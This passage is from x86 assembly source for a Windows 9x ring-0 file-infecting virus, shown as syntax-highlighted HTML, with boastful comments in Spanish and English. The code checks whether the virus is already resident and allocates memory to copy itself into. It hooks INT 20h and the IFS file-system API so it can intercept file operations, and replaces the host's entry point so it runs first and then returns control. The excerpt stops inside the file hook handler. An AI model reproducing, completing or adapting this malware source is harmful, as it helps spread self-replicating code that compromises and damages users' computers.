        </span><span class="sc5">PATCH3</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">50</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">READ_FILE</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;;EBX==&gt;HANDLE</span><span class="sc0">
</span><span class="sc1">;;ECX==&gt;COUNT</span><span class="sc0">
</span><span class="sc1">;;EDX==&gt;POS</span><span class="sc0">
</span><span class="sc1">;;ESI==&gt;BUFFERS</span><span class="sc0">
</span><span class="sc5">WRITE_FILE</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d601h</span><span class="sc0">
        </span><span class="sc5">PATCH4</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">50</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">WRITE_FILE</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;;EBX==&gt;HANDLE</span><span class="sc0">
</span><span class="sc5">CLOSE_FILE</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d700h</span><span class="sc0">
        </span><span class="sc5">PATCH5</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">50</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CLOSE_FILE</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;;EBX==&gt;HANDLE</span><span class="sc0">
</span><span class="sc1">;;EAX Return the File Size</span><span class="sc0">
</span><span class="sc5">GET_FILE_SIZE</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d800h</span><span class="sc0">
        </span><span class="sc5">PATCH6</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">50</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GET_FILE_SIZE</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">



</span><span class="sc1">;;;-------Beguin the Show hehehe--------;;;</span><span class="sc0">
</span><span class="sc1">;; BODY OF MY VIRUS IN RING 0</span><span class="sc0">

</span><span class="sc1">;;Here Beguin the Ring 0 Virus</span><span class="sc0">
</span><span class="sc5">CuerpoDelVirusEnRING0</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">InitRing0</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

</span><span class="sc1">;;;Loock for my virus in memory</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_DIR_INT20h</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vector_irq</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0"> 
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">instalar</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc0"> 
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ya_esta_en_memoria</span><span class="sc0">
</span><span class="sc5">instalar</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;;Enable infeccion Flag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">SDF_OCUPADO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc1">;;Alocate Memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">SIZE_VIRUS</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MemAlloc</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">       </span><span class="sc1">;EAX y EBX=Base For Data</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">BASE_VIRUS_MEM</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc1">;;copy my virus </span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZE_VIRUS</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">;;change the JMP in my CD20</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">OFFSET_A_SALTO_A_OLD_IRQ</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc5">OFFSET_VECTTOR_IRQ</span><span class="sc0"> </span><span class="sc1">;EBX=BASE DE LOS DATOS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc8">EBX</span><span class="sc0">

</span><span class="sc1">;;;;Change the CD20</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">BASE_VIRUS_MEM</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">OFFSET_INT20</span><span class="sc0">   </span><span class="sc1">;offset of my CD20  </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">           
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HOOK_INT20H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">BASE_VIRUS_MEM</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;;;IFS HOOK</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_FILE_HOOKED</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">PATCH7</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">103</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">  </span><span class="sc1">;IFS_ID</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;;Fix the ptr to the olth ifs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;;clean the garbadge</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">BASE_VIRUS_MEM</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_A_SALTO_A_OLD_IFS</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;ebx=offset a la bieja IFS_FILEIO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc8">EBX</span><span class="sc0">  </span><span class="sc1">;EAX=PTR to jmp IFS_FILEIO</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc5">ya_esta_en_memoria</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">CuerpoDelVirusEnRING0</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">



</span><span class="sc1">;;;;NEW ENTRY POINT</span><span class="sc0">
</span><span class="sc5">_WinMain2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DeltaOFFSET</span><span class="sc0">   
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">InitDirectH</span><span class="sc0">
        </span><span class="sc1">;;;;Fixup all int 20h Call</span><span class="sc0">

    </span><span class="sc5">PACH_INT20</span><span class="sc0">  </span><span class="sc5">PATCH1</span><span class="sc4">,</span><span class="sc2">79</span><span class="sc4">,</span><span class="sc5">VMM_ID</span><span class="sc0">
        </span><span class="sc5">PACH_INT20</span><span class="sc0">  </span><span class="sc5">PATCH2</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc5">PACH_INT20</span><span class="sc0">  </span><span class="sc5">PATCH3</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc5">PACH_INT20</span><span class="sc0">  </span><span class="sc5">PATCH4</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc5">PACH_INT20</span><span class="sc0">  </span><span class="sc5">PATCH5</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc5">PACH_INT20</span><span class="sc0">  </span><span class="sc5">PATCH6</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc5">PACH_INT20</span><span class="sc0">  </span><span class="sc5">PATCH7</span><span class="sc4">,</span><span class="sc2">103</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">  
    </span><span class="sc5">PACH_INT20</span><span class="sc0">  </span><span class="sc5">PATCH8</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc5">PACH_INT20</span><span class="sc0">  </span><span class="sc5">PATCH9</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">CS0</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;;;;if can't pass to ring 0 (it NEVER!!! hapens)</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">no_ring0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_RING0INSTALER</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CallRing0</span><span class="sc0"> 
</span><span class="sc5">no_ring0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc1">;;Back To the Host</span><span class="sc0">
</span><span class="sc5">SALTOTRUEEP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc0">  </span><span class="sc1">;;Codigo Maquina del JMP desp</span><span class="sc0">
        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0000</span><span class="sc0">
</span><span class="sc1">;;;;;;END TO NEW ENTRY POINT</span><span class="sc0">



</span><span class="sc1">;;INT 20 HOOKED</span><span class="sc0">
</span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc0">  </span><span class="sc1">;;marc of recident</span><span class="sc0">
</span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'I'</span><span class="sc0">
</span><span class="sc5">Nueva_int</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">sti</span><span class="sc0"> 
        </span><span class="sc6">pusha</span><span class="sc0">

</span><span class="sc1">;;Calcule the Offset where beguin the data</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">SIGG</span><span class="sc0">
        </span><span class="sc5">SIGG</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">DWord</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc0">
</span><span class="sc1">;;EAX=offsed of CALL SIGG</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">;del sti y del pusha</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">     </span><span class="sc1">;del call</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_INT20</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SIZE_DATA</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc1">;;EBP=Base of Data </span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc1">;;End of my Int 20h hahahaha</span><span class="sc0">
</span><span class="sc5">SALTO_A_OLD_IRQ</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">36h</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">02DFFh</span><span class="sc0">     </span><span class="sc1">;It is filled when Virus is load in memory</span><span class="sc0">
        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0000</span><span class="sc0">


</span><span class="sc1">;;;;;;;/////IFS_HOOKED\\\\\\\;;;;;;</span><span class="sc0">
</span><span class="sc5">FILE_HOOKED</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0"> 
        </span><span class="sc6">pusha</span><span class="sc0">
</span><span class="sc1">;;;;;Calcule the Offset where beguin the data</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">SIGGFILEHOOK</span><span class="sc0">
</span><span class="sc5">SIGGFILEHOOK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">DWord</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">      </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc0">
</span><span class="sc1">;;EAX=offsed de CALL SIGG</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">;for the sti and the pusha</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">     </span><span class="sc1">;del call</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_FILE_HOOKED</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc1">;EBP=Base of Data</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">   </span><span class="sc1">;if the flag de SDF_OCUPADO=1, them the IF</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">  </span><span class="sc1">;;if the SDF_OCUPADO=1 them the FSD may works normals</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">SALTO_A_OLD_IFS_INTERNO</span><span class="sc0">

</span><span class="sc5">prosesa</span><span class="sc4">:</span><span class="sc0">         
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">  </span><span class="sc1">;20 is for the Pusha</span><span class="sc0">
